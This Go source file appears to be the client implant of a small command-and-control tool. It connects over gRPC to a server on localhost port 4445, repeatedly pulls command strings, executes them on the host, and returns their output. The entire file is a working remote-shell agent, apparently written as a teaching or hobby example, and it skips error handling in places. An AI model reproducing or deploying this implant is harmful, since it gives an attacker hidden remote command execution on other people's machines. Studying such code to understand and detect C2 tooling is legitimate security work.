package main

import (
	"context"
	"fmt"
	"log"
	"os/exec"
	"simple_proxy/remote_admin_tool/c2grpcapi"
	"strings"
	"time"

	"google.golang.org/grpc"
)

func main() {
	var (
		opts   []grpc.DialOption
		conn   *grpc.ClientConn
		err    error
		client c2grpcapi.EmbedClient
	)

	opts = append(opts, grpc.WithInsecure())
	if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 4445), opts...); err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	client = c2grpcapi.NewEmbedClient(conn)
	ctx := context.Background()
	for {
		var req = new(c2grpcapi.Empty)
		cmd, err := client.GetCommand(ctx, req)
		// if err != nil {
		// 	cmd.Output = err.Error()
		// }
		if cmd.Input == "" {
			time.Sleep(3 * time.Second)
		}
		tokens := strings.Split(cmd.Input, " ")
		var c *exec.Cmd
		if len(tokens) == 1 {
			c = exec.Command(tokens[0])
		} else {
			c = exec.Command(tokens[0], tokens[1:]...)
		}

		buf, err := c.CombinedOutput()
		if err != nil {
			cmd.Output = err.Error()
		}
		cmd.Output += string(buf)
		client.SendResult(ctx, cmd)
	}
}
